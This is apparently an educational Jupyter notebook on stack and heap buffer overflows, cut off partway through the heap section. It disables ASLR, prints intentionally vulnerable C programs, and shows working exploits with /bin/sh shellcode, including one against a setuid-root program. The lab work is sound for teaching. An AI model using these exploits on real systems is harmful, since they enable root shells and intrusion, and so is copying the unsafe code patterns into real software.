{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Buffer Overflows\n",
    "## NOTE: Use X86 system to exploit overflow!\n",
    "- x64 system hasn't been very kind to me!\n",
    "\n",
    "- most Internet worms use buffer overflow vulnerabilities to propagate\n",
    "- C and C++ assume that programmers are responsible for data integrity\n",
    "- modern compilers and OSes provide various protections making it harder to exploit traditional buffer overflows\n",
    "- once the buffer is allocated, there's no built-in mechanism to safeguard the amount of data that can be stored into to\n",
    "    - this is called buffer overrun or buffer overflow\n",
    "    - user data may overwrite other part of the memory it's not supposed to making the program behave differently or crashing the program\n",
    "    - hackers could take advantage of this flaw to control the program and may pawn the system by executing shellcode or payload of their choice\n",
    "- buffer overflow can violate all three core principles of **CIA** triad - **Confidentiality, Integrity, and Availability**\n",
    "- **Confidentiality**: allows attackers to read confidential or data that they're not supposed to have access to\n",
    "- **Integrity**: allows attackers to modify part of the data/program that they're not supposed to\n",
    "- **Availability**: allows attackes to crash the system (SEGFAULT) violating availbility of the service\n",
    "\n",
    "- typically two types:\n",
    "    1. stack overflow\n",
    "    2. heap overflow"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Disable ASLR and other compiler protections\n",
    "- compile.sh script disables compiler protections"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# if value is 0; ASLR is disabled\n",
    "! cat /proc/sys/kernel/randomize_va_space"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# run this on terminal\n",
    "# can't interactively type sudo password!\n",
    "! echo 0 | sudo tee /proc/sys/kernel/randomize_va_space"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Stack Overflow\n",
    "- overrun in stack segment\n",
    "- let's use some programs to demonstrate stackoverflow\n",
    "\n",
    "## Some consequences of stack overflow\n",
    "\n",
    "1. overwrite variable(s) with the data of your choice (Integrity)\n",
    "- change the flow of the program (Integrity)\n",
    "- remote code execution (Integrity, Confidentiality, Availability)\n",
    "\n",
    "### 1. overwrite variables with the data of your choice\n",
    "- demo program: booksrc/overflow_example.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's looks at the content of overlfow_example.c\n",
    "! cat booksrc/overflow_example.c"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### draw stack of main to answer the following questions\n",
    "- what is the order of the variables pushed?\n",
    "- when argv[1] is copied to buffer_two, what may happen to other variables?\n",
    "- compile and run the program with some arguments"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./compile.sh booksrc/overflow_example.c overflow_example.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./overflow_example.exe\n",
    "# segfault is bad!! provide some argument"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# run the program providing some argument\n",
    "! ./overflow_example.exe hello"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# try a few some other values like 15 As and observe!\n",
    "! ./overflow_example.exe $(perl -e 'print \"A\"x15')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# try 16As and notice the int value variable\n",
    "! ./overflow_example.exe $(perl -e 'print \"A\"x16 . \"BCDE\"')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- try to overwrite int value variable with \"BCDE\"\n",
    "- how may bytes is value away from buffer_two?\n",
    "- find the difference between the address of value and buffer_two"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# subtract the address of buffer_two from the address of value\n",
    "# which variable is at higher location?\n",
    "! echo $((0xffffd19c - 0xffffd18c))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# now try overwriting value with BCDE\n",
    "! ./overflow_example.exe $(perl -e 'print \"A\"x16 . \"BCDE\"')\n",
    "# check if BCDE is in that order...\n",
    "# remember x86 is little-endian, i.e., smaller byte is stored first"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# check the hex values with python; also see the values of buffer_two and buffer_one\n",
    "chr(int('42', 16))\n",
    "# B is stored at the end!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# try one more time; using hex values of EDCB\n",
    "! ./overflow_example.exe $(perl -e 'print \"A\"x16 . \"\\x45\\x44\\x43\\x42\"')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 2. change the flow of the program\n",
    "#### e.g. authenticate without using actual password\n",
    "- use ./booksrc/auth_overflow.c program as demo\n",
    "- let's see the contents fo auth"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat ./booksrc/auth_overflow.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's compile booksrc/auth_overflow.c\n",
    "! ./compile.sh ./booksrc/auth_overflow.c auth_overflow.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# run the program; gives help\n",
    "! ./auth_overflow.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# authenticate with password, outgrabe\n",
    "! ./auth_overflow.exe outgrabe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# authenticate with password, brillig\n",
    "! ./auth_overflow.exe brillig"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# anyother password shouldn't work!\n",
    "! ./auth_overflow.exe letmein"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### let's authenticate without real password"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Let's provide 16 As as password\n",
    "! ./auth_overflow.exe $(perl -e 'print \"A\"x16')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# how about 17 As\n",
    "! ./auth_overflow.exe $(perl -e 'print \"A\"x17')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### draw stack of check_authentication( ) to understand why 17As let's you in"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### examine stack using gdb-peda\n",
    "- run the program in GDB to see the address of auth_flag relative to that of password_buffer\n",
    "- peda will show address of both password_buffer and auth_flag in stack context\n",
    "\n",
    "```bash\n",
    "$ ./gdb -q auth_overflow.exe\n",
    "$ break check_authentication\n",
    "$ run $(perl -e 'print \"A\"x20')\n",
    "$ next i\n",
    "$ x/s password_buffer\n",
    "$ x/x &auth_flag\n",
    "$ p/a &password_buffer\n",
    "$ p/d auth_flag\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### can you overflow if the variable declaration orders are switched?\n",
    "- compile and examine booksrc/auth_overflow2.c\n",
    "- draw stack\n",
    "- verify it using GDB"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "# let's see the source code of booksrc/auth_overflow2.c\n",
    "! cat ./booksrc/auth_overflow2.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's compile the program\n",
    "! ./compile_bash.sh booksrc/auth_overflow2.c auth_overflow2.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# run the program with 17As\n",
    "! ./auth_overflow2.exe $(perl -e 'print \"A\"x17')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### well, how is it possible?\n",
    "- see in gdb where auth_flag is compared to password_buffer\n",
    "- turns out auth_flag is still at higher address (pushed before) compared to password_buffer\n",
    "- compile optimization? (I don't have clear answer to why!)\n",
    "- if auth_flag is in lower address compared to password_buffer, you can't overwrite it by oveflowing password_buffer\n",
    "- see Hacking textbook\n",
    "\n",
    "### control return to the right block to authenticate  \n",
    "- overflow the return address to bypass check_authentication() condition in main and directly execute the true block\n",
    "- possible in older gcc/assembly version (Hacking LiveCD)\n",
    "- couldn't get it to work on newer system (tested on Kali (4-19-0)!\n",
    "- let's assemble and look at the return instruction...\n",
    "- repeated instructions add esp, 0x10 and sub esp, 0xc makes it hard to jump into the righ instruction\n",
    "\n",
    "### can return to printf(\"    access granted     \")\n",
    "- find the address add esp, 0x10 before the addres to \"access granted\"\n",
    "- use that address to overwrite the return address with\n",
    "- find the offset from password_buffer to return address (32 bytes)\n",
    "    - subtract the the address of password_buffer from the address of return address\n",
    "    - or use gdb peda\n",
    "    \n",
    "```bash\n",
    "- $pattern arg 100 # create a pattern of 100 and set as the argument\n",
    "- $run the program until segfault\n",
    "- $patts # see EIP offset which is the return address\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 3. Remote code execution\n",
    "- inject and execute shellcode\n",
    "- shellcode is a program that gives you shell on the system\n",
    "- we'll use a vulnerable program booksrc/stackoverflowdemo.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's look at the source of stackoverflowdemo.c\n",
    "# program simply copies and echoes user provided argument\n",
    "! cat booksrc/stackoverflowdemo.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's compile and execute the program\n",
    "! ./compile.sh booksrc/stackoverflowdemo.c stackoverflowdemo.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./stackoverflowdemo.exe $(perl -e 'print \"A\"x100')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### exploit stackoverflow vulnerability\n",
    "#### code execution\n",
    "- create an exploit code\n",
    "- exploit code typically has the following structure:\n",
    "```\n",
    "repeated nop sled | exploit code | repeated return address\n",
    "```\n",
    "- **nop sled**: \\x90 no operation instruction\n",
    "- **exploit code**: shell code, local or remote, tcp connect, reverse connect\n",
    "- **repeated return address** - address pointing to some address of repeated nop sled  where it is stored in buffer\n",
    "- provide the exploit code to the vulnerable program as an argument\n",
    "- for now simply use provided exploit code; later learn how to generate your own exploit code\n",
    "- the exploit code is in booksrc/exploit_stackoverflow.py"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#!/usr/bin/env python2\r\n",
      "#\r\n",
      "# Template for local argv exploit code, generated by PEDA\r\n",
      "#\r\n",
      "import os\r\n",
      "import sys\r\n",
      "import struct\r\n",
      "import resource\r\n",
      "import time\r\n",
      "\r\n",
      "def usage():\r\n",
      "    print \"Usage: %s target_program\" % sys.argv[0]\r\n",
      "    return\r\n",
      "\r\n",
      "def pattern(size=1024, start=0):\r\n",
      "    try:\r\n",
      "        bytes = open(\"pattern.txt\").read(size+start)\r\n",
      "        return bytes[start:]\r\n",
      "    except:\r\n",
      "        return \"A\"*size\r\n",
      "\r\n",
      "def nops(size=1024):\r\n",
      "    return \"\\x90\"*size\r\n",
      "\r\n",
      "def int2hexstr(num, intsize=4):\r\n",
      "    if intsize == 8:\r\n",
      "        if num < 0:\r\n",
      "            result = struct.pack(\"<q\", num)\r\n",
      "        else:\r\n",
      "            result = struct.pack(\"<Q\", num)\r\n",
      "    else:\r\n",
      "        if num < 0:\r\n",
      "            result = struct.pack(\"<l\", num)\r\n",
      "        else:\r\n",
      "            result = struct.pack(\"<L\", num)\r\n",
      "    return result\r\n",
      "\r\n",
      "i2hs = int2hexstr\r\n",
      "\r\n",
      "def list2hexstr(intlist, intsize=4):\r\n",
      "    result = \"\"\r\n",
      "    for value in intlist:\r\n",
      "        if isinstance(value, str):\r\n",
      "            result += value\r\n",
      "        else:\r\n",
      "            result += int2hexstr(value, intsize)\r\n",
      "    return result\r\n",
      "\r\n",
      "l2hs = list2hexstr\r\n",
      "\r\n",
      "def exploit(vuln):\r\n",
      "    # x86/linux/exec: 24 bytes\r\n",
      "    shellcode = (\r\n",
      "    \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\"\r\n",
      "    \"\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\"\r\n",
      "    )\r\n",
      "    # nop sled\r\n",
      "    # calcualate the size of nop sled\r\n",
      "    # offset to return address (ebp+4) - len(exploit code) - (return addresses)\r\n",
      "    padding = nops(48) #72-24 or 76-24-4\r\n",
      "    payload = [padding]\r\n",
      "    # shellcode\r\n",
      "    payload += shellcode # put your payload here\r\n",
      "    # repeated return address\r\n",
      "    # change this value by finding the base address of buffer\r\n",
      "    # or some address of where nop instructions will be\r\n",
      "    # make sure to run the program with the actual exploit length\r\n",
      "    # when getting the base address of buffer\r\n",
      "    payload += \"\\x60\\xf1\\xff\\xbf\"\r\n",
      "    payload = list2hexstr(payload)\r\n",
      "    args = [vuln, payload]\r\n",
      "    env = {\"PEDA\":nops()}\r\n",
      "    resource.setrlimit(resource.RLIMIT_STACK, (-1, -1))\r\n",
      "    resource.setrlimit(resource.RLIMIT_CORE, (-1, -1))\r\n",
      "    os.execve(vuln, args, env)\r\n",
      "\r\n",
      "if __name__ == \"__main__\":\r\n",
      "    if len(sys.argv) < 2:\r\n",
      "        usage()\r\n",
      "    else:\r\n",
      "        exploit(sys.argv[1])\r\n",
      "    "
     ]
    }
   ],
   "source": [
    "#  let's look at the exploit code written in Python 2\n",
    "! cat booksrc/exploit_stackoverflow.py"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### getting the controlled return address\n",
    "- before you execute the exploit code; you must know the return address where the exploit code will be loaded\n",
    "- first find the offset (EIP+0) of actual return address from the buffer to be overrun\n",
    "- two ways:\n",
    "    1. use gdb\n",
    "        - length of the argument = return address - buffer address + 4\n",
    "    2. use peda pattern search technique as described below"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### how was the exploit_stackoverflow.py generated?\n",
    "\n",
    "### using GDB-PEDA\n",
    "- create pattern and use as an agrument to the program\n",
    "- crash the vulnerable program and run pattern search or patts to find offset of return address\n",
    "    - gdb -q ./stackoverflowdemo.exe\n",
    "    - pattern arg 200\n",
    "    - run \n",
    "    - after program crashes run\n",
    "    - patts or pattern search\n",
    "    - look for EIP.and note the EIP offset or EBP+0\n",
    "        - ..found at offset [#] that's the total offset  where return address (including retrun address) is from the overflown buffer's base address \n",
    "        \n",
    "- generate skeleton exploit code using GDB-PEDA\n",
    "    - skeleton argv exploit_stackoverflow.py\n",
    "- create local linux shellcode \n",
    "    - shellcode generate x86/linux exec"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Using bash to exploit stackoverflowdemo.exe\n",
    "- create payload buffer with shellcode\n",
    "    - 48 bytes nop sleds + shellcode (24 bytes) + return address (4 bytes)\n",
    "- run program with the payload\n",
    "    - `$ ./stackoverflowdemo.exe $(cat payloadFile)`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "stackoverflowpayload.bin Size in bytes\n",
      "76 stackoverflowpayload.bin\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "# Create payload buffer with exploit code\n",
    "payloadFile=stackoverflowpayload.bin\n",
    "perl -e 'print \"\\x90\"x48' > $payloadFile\n",
    "cat ./booksrc/shellcodex86linuxexec >> $payloadFile\n",
    "perl -e 'print \"\\x60\\xf1\\xff\\xbf\"' >> $payloadFile\n",
    "# check the size of the file\n",
    "echo \"$payloadFile Size in bytes\"\n",
    "wc -c $payloadFile"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### booksrc/notesearch.c has stackoverflow vulnerability\n",
    "- let's look at the source of booksrc/notesearch.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <string.h>\r\n",
      "#include <fcntl.h>\r\n",
      "#include <sys/stat.h>\r\n",
      "#include \"hacking.h\"\r\n",
      "\r\n",
      "#define FILENAME \"/var/notes\"\r\n",
      "\r\n",
      "int print_notes(int, int, char *);   // note printing function\r\n",
      "int find_user_note(int, int);        // seek in file for a note for user\r\n",
      "int search_note(char *, char *);     // search for keyword function\r\n",
      "void fatal(char *);                  // fatal error handler\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "\tint userid, printing=1, fd; // file descriptor\r\n",
      "\tchar searchstring[100];\r\n",
      "\r\n",
      "\tif(argc > 1)                        // If there is an arg\r\n",
      "\t\tstrcpy(searchstring, argv[1]);   //   that is the search string\r\n",
      "\telse                                // otherwise\r\n",
      "\t\tsearchstring[0] = 0;             //   search string is empty\r\n",
      "\r\n",
      "\tuserid = getuid();\r\n",
      "\tfd = open(FILENAME, O_RDONLY);   // open the file for read-only access\r\n",
      "\tif(fd == -1)\r\n",
      "\t\tfatal(\"in main() while opening file for reading\");\r\n",
      "\r\n",
      "\twhile(printing)\r\n",
      "\t\tprinting = print_notes(fd, userid, searchstring);\r\n",
      "\tprintf(\"-------[ end of note data ]-------\\n\");\r\n",
      "\tclose(fd);\r\n",
      "}\r\n",
      "\r\n",
      "// A function to print the notes for a given uid that match\r\n",
      "// an optional search string\r\n",
      "// returns 0 at end of file, 1 if there are still more notes\r\n",
      "int print_notes(int fd, int uid, char *searchstring) {\r\n",
      "\tint note_length;\r\n",
      "\tchar byte=0, note_buffer[100];\r\n",
      "\t\r\n",
      "\tnote_length = find_user_note(fd, uid);\r\n",
      "\tif(note_length == -1)  // if end of file reached\r\n",
      "\t\treturn 0;           //   return 0\r\n",
      "\r\n",
      "\tread(fd, note_buffer, note_length); // read note data\r\n",
      "\tnote_buffer[note_length] = 0;       // terminate the string\r\n",
      "\t\r\n",
      "\tif(search_note(note_buffer, searchstring)) // if searchstring found\r\n",
      "\t\tprintf(note_buffer);                    //   print the note\r\n",
      "\treturn 1;\r\n",
      "}\r\n",
      "\r\n",
      "// A function to find the next note for a given userID\r\n",
      "// returns -1 if the end of the file is reached\r\n",
      "// otherwise it returns the length of the found note\r\n",
      "int find_user_note(int fd, int user_uid) {\r\n",
      "\tint note_uid=-1;\r\n",
      "\tunsigned char byte;\r\n",
      "\tint length;\r\n",
      "\r\n",
      "\twhile(note_uid != user_uid) {  // loop until a note for user_uid is found\r\n",
      "\t\tif(read(fd, &note_uid, 4) != 4) // read the uid data\r\n",
      "\t\t\treturn -1; // if 4 bytes aren't read, return end of file code\r\n",
      "\t\tif(read(fd, &byte, 1) != 1) // read the newline separator\r\n",
      "         return -1;\r\n",
      "\r\n",
      "\t\tbyte = length = 0;\r\n",
      "\t\twhile(byte != '\\n') {  // figure out how many bytes to the end of line\r\n",
      "\t\t\tif(read(fd, &byte, 1) != 1) // read a single byte\r\n",
      "\t\t\t\treturn -1;     // if byte isn't read, return end of file code\r\n",
      "\t\t\tlength++;  \r\n",
      "\t\t}\r\n",
      "\t}\r\n",
      "\tlseek(fd, length * -1, SEEK_CUR); // rewind file reading by length bytes\r\n",
      "\r\n",
      "\tprintf(\"[DEBUG] found a %d byte note for user id %d\\n\", length, note_uid);\r\n",
      "\treturn length;\r\n",
      "}\r\n",
      "\r\n",
      "// A function to search a note for a given keyword\r\n",
      "// returns 1 if a match is found, 0 if there is no match\r\n",
      "int search_note(char *note, char *keyword) {\r\n",
      "\tint i, keyword_length, match=0;\r\n",
      "\r\n",
      "\tkeyword_length = strlen(keyword);\r\n",
      "\tif(keyword_length == 0)  // if there is no search string\r\n",
      "\t\treturn 1;              // always \"match\"\r\n",
      "\t\r\n",
      "\tfor(i=0; i < strlen(note); i++) { // iterate over bytes in note\r\n",
      "\t\tif(note[i] == keyword[match])  // if byte matches keyword\r\n",
      "\t\t\tmatch++;   // get ready to check the next byte\r\n",
      "\t\telse {        //   otherwise\r\n",
      "\t\t\tif(note[i] == keyword[0]) // if that byte matches first keyword byte\r\n",
      "\t\t\t\tmatch = 1;  // start the match count at 1\r\n",
      "\t\t\telse\r\n",
      "\t\t\t\tmatch = 0;  // otherwise it is zero\r\n",
      "\t\t}\r\n",
      "\t\tif(match == keyword_length) // if there is a full match\r\n",
      "\t\t\treturn 1;   // return matched\r\n",
      "\t}\r\n",
      "\treturn 0;  // return not matched\r\n",
      "}\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "! cat booksrc/notesearch.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 74,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[01m\u001b[Kbooksrc/notesearch.c:\u001b[m\u001b[K In function ‘\u001b[01m\u001b[Kmain\u001b[m\u001b[K’:\r\n",
      "\u001b[01m\u001b[Kbooksrc/notesearch.c:23:11:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[Kimplicit declaration of function ‘\u001b[01m\u001b[Kgetuid\u001b[m\u001b[K’ [\u001b[01;35m\u001b[K-Wimplicit-function-declaration\u001b[m\u001b[K]\r\n",
      "   23 |  userid = \u001b[01;35m\u001b[Kgetuid\u001b[m\u001b[K();\r\n",
      "      |           \u001b[01;35m\u001b[K^~~~~~\u001b[m\u001b[K\r\n",
      "\u001b[01m\u001b[Kbooksrc/notesearch.c:31:2:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[Kimplicit declaration of function ‘\u001b[01m\u001b[Kclose\u001b[m\u001b[K’; did you mean ‘\u001b[01m\u001b[Kpclose\u001b[m\u001b[K’? [\u001b[01;35m\u001b[K-Wimplicit-function-declaration\u001b[m\u001b[K]\r\n",
      "   31 |  \u001b[01;35m\u001b[Kclose\u001b[m\u001b[K(fd);\r\n",
      "      |  \u001b[01;35m\u001b[K^~~~~\u001b[m\u001b[K\r\n",
      "      |  \u001b[32m\u001b[Kpclose\u001b[m\u001b[K\r\n",
      "\u001b[01m\u001b[Kbooksrc/notesearch.c:\u001b[m\u001b[K In function ‘\u001b[01m\u001b[Kprint_notes\u001b[m\u001b[K’:\r\n",
      "\u001b[01m\u001b[Kbooksrc/notesearch.c:45:2:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[Kimplicit declaration of function ‘\u001b[01m\u001b[Kread\u001b[m\u001b[K’; did you mean ‘\u001b[01m\u001b[Kfread\u001b[m\u001b[K’? [\u001b[01;35m\u001b[K-Wimplicit-function-declaration\u001b[m\u001b[K]\r\n",
      "   45 |  \u001b[01;35m\u001b[Kread\u001b[m\u001b[K(fd, note_buffer, note_length); // read note data\r\n",
      "      |  \u001b[01;35m\u001b[K^~~~\u001b[m\u001b[K\r\n",
      "      |  \u001b[32m\u001b[Kfread\u001b[m\u001b[K\r\n",
      "\u001b[01m\u001b[Kbooksrc/notesearch.c:\u001b[m\u001b[K In function ‘\u001b[01m\u001b[Kfind_user_note\u001b[m\u001b[K’:\r\n",
      "\u001b[01m\u001b[Kbooksrc/notesearch.c:74:2:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[Kimplicit declaration of function ‘\u001b[01m\u001b[Klseek\u001b[m\u001b[K’; did you mean ‘\u001b[01m\u001b[Kfseek\u001b[m\u001b[K’? [\u001b[01;35m\u001b[K-Wimplicit-function-declaration\u001b[m\u001b[K]\r\n",
      "   74 |  \u001b[01;35m\u001b[Klseek\u001b[m\u001b[K(fd, length * -1, SEEK_CUR); // rewind file reading by length bytes\r\n",
      "      |  \u001b[01;35m\u001b[K^~~~~\u001b[m\u001b[K\r\n",
      "      |  \u001b[32m\u001b[Kfseek\u001b[m\u001b[K\r\n"
     ]
    }
   ],
   "source": [
    "# lets compile notesearch.c to a binary\n",
    "! ./compile.sh booksrc/notesearch.c notesearch.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### notesearch program finds note from /var/notes priviledged folder\n",
    "- change ownership to root and setuid\n",
    "\n",
    "```bash\n",
    "$ sudo chown root:root notesearch.exe\n",
    "$ sudo chmod +s notesearch.exe\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 75,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rwsr-sr-x 1 root root 19928 Apr 27 13:42 notesearch.exe\r\n"
     ]
    }
   ],
   "source": [
    "# let's see the detail of notesearch.exe\n",
    "! ls -al notesearch.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./notesearch.exe $(perl -e 'print \"A\"x60')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### notesearch exploit\n",
    "- booksrc has provide exploit code written in C\n",
    "- shellcode is modified to work on modern x86 kernel\n",
    "- let's compile and run the exploit code in terminal"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "char shellcode[]= \r\n",
      "\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\r\n",
      "\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\r\n",
      "\"\\xe1\\xcd\\x80\";\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "   unsigned int i, *ptr, ret, offset=224;\r\n",
      "   char *command, *buffer;\r\n",
      "\r\n",
      "   command = (char *) malloc(200);\r\n",
      "   bzero(command, 200); // zero out the new memory\r\n",
      "\r\n",
      "   strcpy(command, \"./notesearch.exe \\'\"); // start command buffer\r\n",
      "   buffer = command + strlen(command); // set buffer at the end\r\n",
      "\r\n",
      "   if(argc > 1) // set offset\r\n",
      "      offset = atoi(argv[1]);\r\n",
      "\r\n",
      "   ret = (unsigned int) &i - offset; // set return address\r\n",
      "\r\n",
      "   for(i=0; i < 160; i+=4) // fill buffer with return address\r\n",
      "      *((unsigned int *)(buffer+i)) = ret;\r\n",
      "   memset(buffer, 0x90, 60); // build NOP sled\r\n",
      "   memcpy(buffer+60, shellcode, sizeof(shellcode)-1); \r\n",
      "\r\n",
      "   strcat(command, \"\\'\");\r\n",
      "\r\n",
      "   system(command); // run exploit\r\n",
      "   free(command);\r\n",
      "}\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "# let's look at the exploit code\n",
    "! cat booksrc/exploit_notesearch.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's compile the exploit code\n",
    "# if you know the exact offset; modify the value of offset and compile\n",
    "# if not don't worry about it, you can try and guess!\n",
    "! ./compile.sh booksrc/exploit_notesearch.c exploit_notesearch.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### run the exploit\n",
    "- run the exploit_notesearch.exe from the terminal\n",
    "- use wrapper bash script booksrc/exploit_notesearch.sh to try different offset\n",
    "\n",
    "```bash\n",
    "$ ./exploit_notesearch.exe\n",
    "$ bash exploit_notesearch.sh\n",
    "```\n",
    "- change the range if you still do not get the shell"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Heap Overflow\n",
    "- buffer overflow can happen in other segments such as **heap**, **data** and **bss**\n",
    "- if an important variable is located after a buffer vulnerable to an overflow, the program's control flow can be altered (regardless of the memory segment)\n",
    "    - controls may be limited\n",
    "- not standarized as stack overflow but can be just as effective\n",
    "\n",
    "### booksrc/notetaker.c is susceptible to heap overflow\n",
    "```strcpy(buffer, argv[1]); // problem!\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "#include <fcntl.h>\r\n",
      "#include <sys/stat.h>\r\n",
      "#include \"hacking.h\"\r\n",
      "\r\n",
      "void usage(char *prog_name, char *filename) {\r\n",
      "   printf(\"Usage: %s <data to add to %s>\\n\", prog_name, filename);\r\n",
      "   exit(0);\r\n",
      "}\r\n",
      "\r\n",
      "void fatal(char *);            // a function for fatal errors\r\n",
      "void *ec_malloc(unsigned int); // an errorchecked malloc() wrapper\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "   int userid, fd; // file descriptor\r\n",
      "   char *buffer, *datafile;\r\n",
      "\r\n",
